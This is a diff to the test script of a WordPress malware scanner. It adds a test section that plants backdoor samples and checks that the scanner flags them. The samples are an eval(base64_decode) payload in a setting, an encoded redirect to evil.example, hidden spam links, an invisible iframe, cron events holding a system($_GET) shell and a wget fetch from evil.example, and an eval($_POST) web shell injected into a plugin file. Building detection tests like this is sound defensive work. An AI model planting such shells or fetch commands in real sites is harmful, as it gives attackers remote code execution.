@@ -75,7 +75,7 @@ printf '<?php /* nothing here */ ?>\n' > "$C/uploads/2026/08/index.php"
 printf '<?php $cache = array(); return $cache;\n' > "$C/cache/wp-rocket/example.com/index-https.php"
 printf '<?php\n/**\n * Plugin Name: Performance Lab\n * Author: WordPress Performance Team\n */\n' > "$C/plugins/performance-lab/load.php"
 printf '<?php\n/* Plugin Name: Akismet */\n' > "$C/upgrade-temp-backup/plugins/akismet/akismet.php"
-printf '<?php\n// Drop-in\n$x = 1;\n' > "$C/object-cache.php"
+printf '<?php\n/*\nPlugin Name: Redis Object Cache Drop-In\n*/\n$x = 1;\n' > "$C/object-cache.php"
 printf '# BEGIN Wordfence code execution protection\n<IfModule mod_php5.c>\nphp_flag engine 0\n</IfModule>\nAddHandler cgi-script .php .phtml .php3 .pl .py .jsp .asp .htm .shtml .sh .cgi\nOptions -ExecCGI\n# END Wordfence\n' > "$C/uploads/.htaccess"
 printf 'auto_prepend_file = "%s/wordfence-waf.php"\n' "$SITE" > "$SITE/.user.ini"
 R=$(scan)
@@ -620,7 +620,71 @@ rm -f "$C/mu-plugins/wp2ss-test-outbox.php" "$OUTBOX"
 $WP php2shell fleet leave >/dev/null 2>&1; $WP eval 'delete_site_option( "wp2ss_fleet_sites" ); delete_site_option( "wp2ss_fleet" );' >/dev/null
 $WP eval 'delete_site_option( "wp2ss_fleet_queue" ); wp_clear_scheduled_hook( "wp2ss_fleet_alerts" );' >/dev/null
 
-section "17. Cleanup → clean again"
+section "17. Database backdoors & plugin files"
+R=$(scan)
+hasnt "$R" '[.findings[] | select(.type=="database" and .severity!="low")] | length > 0' "clean database: no database findings"
+# Bait that must stay quiet: an analytics snippet in a setting, an embed script in a post.
+$WP option add zzt_ok_js '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script><script>window.dataLayer=window.dataLayer||[];</script>' >/dev/null
+P_OK=$($WP post create --post_title='Tweet embed' --post_status=publish --post_content='<blockquote class="twitter-tweet"></blockquote><script async src="https://platform.twitter.com/widgets.js"></script>' --porcelain)
+# Indicators.
+$WP option add zzt_payload '<?php eval(base64_decode($x)); ?>' >/dev/null
+$WP option add zzt_redirect '<script>eval(atob("bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9ldmlsLmV4YW1wbGUiOw=="))</script>' >/dev/null
+P_SPAM=$($WP post create --post_title='Spam' --post_status=publish --post_content='<p>Hi</p><div style="display:none"><a href="https://a.example">a</a> <a href="https://b.example">b</a> <a href="https://c.example">c</a></div>' --porcelain)
+P_FRAME=$($WP post create --post_title='Frame' --post_status=publish --post_content='<iframe src="https://x.example" width="0" height="0"></iframe>' --porcelain)
+$WP eval 'wp_schedule_single_event( time() + 3600, "wp2ss_t_code", array( "<?php system(\$_GET[1]);" ) );
+	wp_schedule_single_event( time() + 3600, "wp2ss_t_fetch", array( "wget -q https://evil.example/x.sh" ) );
+	wp_schedule_single_event( time() + 3600, "a8f3k2m9x7q1w5e6r4" );' >/dev/null
+# A drop-in nobody explains.
+printf '<?php\n// page cache\n' > "$C/advanced-cache.php"
+# A wordpress.org plugin with one changed file and one extra file. wordpress.org's
+# checksum API is answered by a test mu-plugin, so this runs offline.
+mkdir -p "$C/plugins/wp2ss-t-org/inc" "$C/mu-plugins"
+printf '<?php\n/*\nPlugin Name: Org Test\nVersion: 1.0\n*/\n' > "$C/plugins/wp2ss-t-org/wp2ss-t-org.php"
+printf '<?php // part a\n' > "$C/plugins/wp2ss-t-org/inc/a.php"
+printf '<?php // part b\n' > "$C/plugins/wp2ss-t-org/inc/b.php"
+SUMS=$(php -r '$d=$argv[1]; $o=array(); foreach (array("wp2ss-t-org.php","inc/a.php","inc/b.php") as $f) { $o[$f]=array("md5"=>md5_file("$d/$f"),"sha256"=>""); } echo json_encode(array("files"=>$o));' "$C/plugins/wp2ss-t-org")
+echo "$SUMS" > "$C/wp2ss-t-sums.json"
+cat > "$C/mu-plugins/wp2ss-t-checksums.php" <<'PHP'
+<?php
+add_filter( 'pre_http_request', function ( $pre, $args, $url ) {
+	if ( false === strpos( $url, 'downloads.wordpress.org/plugin-checksums/' ) ) {
+		return $pre;
+	}
+	$ok = false !== strpos( $url, '/wp2ss-t-org/1.0.json' );
+	return array( 'response' => array( 'code' => $ok ? 200 : 404, 'message' => '' ), 'body' => $ok ? file_get_contents( WP_CONTENT_DIR . '/wp2ss-t-sums.json' ) : '', 'headers' => array(), 'cookies' => array() );
+}, 10, 3 );
+PHP
+printf '<?php // part a\neval($_POST["x"]);\n' > "$C/plugins/wp2ss-t-org/inc/a.php"
+printf '<?php // not shipped\n' > "$C/plugins/wp2ss-t-org/inc/extra.php"
+$WP transient delete --all >/dev/null 2>&1
+
+R=$(scan)
+has   "$R" "$(sev high 'decodes or runs other code: stored in the setting .zzt_payload')" "PHP payload stored in an option (high)"
+has   "$R" "$(sev high 'decodes hidden JavaScript.*zzt_redirect')" "self-decoding script stored in an option (high)"
+hasnt "$R" "$(msg 'zzt_ok_js')" "analytics snippet in an option isn't flagged"
+has   "$R" "$(sev medium "hidden from visitors.*#$P_SPAM")" "hidden spam links in a post (medium)"
+has   "$R" "$(sev high "Invisible frame.*#$P_FRAME")" "invisible iframe in a post (high)"
+hasnt "$R" "$(msg "#$P_OK ")" "embed script in a post isn't flagged"
+has   "$R" "$(sev high 'wp2ss_t_code. carries code')" "cron event carrying code (high)"
+has   "$R" "$(sev medium 'wp2ss_t_fetch. downloads a script')" "cron event downloading a script (medium)"
+has   "$R" "$(msg 'random-looking names.*a8f3k2m9x7q1w5e6r4')" "random cron hook with no handler"
+hasnt "$R" "$(msg 'setting .cron.')" "cron events aren't reported twice as a setting"
+has   "$R" "$(sev medium 'Drop-in advanced-cache.php')" "unexplained drop-in (medium)"
+hasnt "$R" "$(msg 'differs from the official copy')" "plugin files aren't checked with --skip-core"
+R=$($WP php2shell scan --format=json --min=info 2>/dev/null)
+has   "$R" "$(sev high 'differs from the official copy on wordpress.org: wp2ss-t-org/inc/a.php')" "modified wordpress.org plugin file (high)"
+hasnt "$R" "$(msg 'differs from the official copy on wordpress.org: wp2ss-t-org/inc/b.php')" "unchanged plugin file passes"
+has   "$R" "$(sev medium 'isn.t part of Org Test 1.0: wp2ss-t-org/inc/extra.php')" "extra PHP file in a wordpress.org plugin (medium)"
+has   "$R" "$(msg 'Checked [0-9]+ plugin.s. against wordpress.org')" "plugin verification summary"
+hasnt "$R" "$(msg 'differs from the official copy on wordpress.org: wp2shell-scanner/')" "the scanner doesn't check itself against wordpress.org"
+
+# Clean up for the final section.
+$WP option delete zzt_ok_js zzt_payload zzt_redirect >/dev/null
+$WP post delete "$P_OK" "$P_SPAM" "$P_FRAME" --force >/dev/null
+$WP eval 'foreach ( array( "wp2ss_t_code", "wp2ss_t_fetch", "a8f3k2m9x7q1w5e6r4" ) as $h ) { wp_clear_scheduled_hook( $h, array( "<?php system(\$_GET[1]);" ) ); wp_clear_scheduled_hook( $h, array( "wget -q https://evil.example/x.sh" ) ); wp_clear_scheduled_hook( $h ); }' >/dev/null
+rm -rf "$C/advanced-cache.php" "$C/plugins/wp2ss-t-org" "$C/mu-plugins/wp2ss-t-checksums.php" "$C/wp2ss-t-sums.json"
+
+section "18. Cleanup → clean again"
 rm -rf "$C/plugins/wp2shell_6a5566a6" "$C/plugins/cmsmap" "$C/upgrade/wp2shell_79b06a80" \
 	"$C/cache/x.php" "$C/uploads/2026/07/img.php" "$C/uploads/.htaccess" "$C/themes/.hidden.php" \
 	"$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
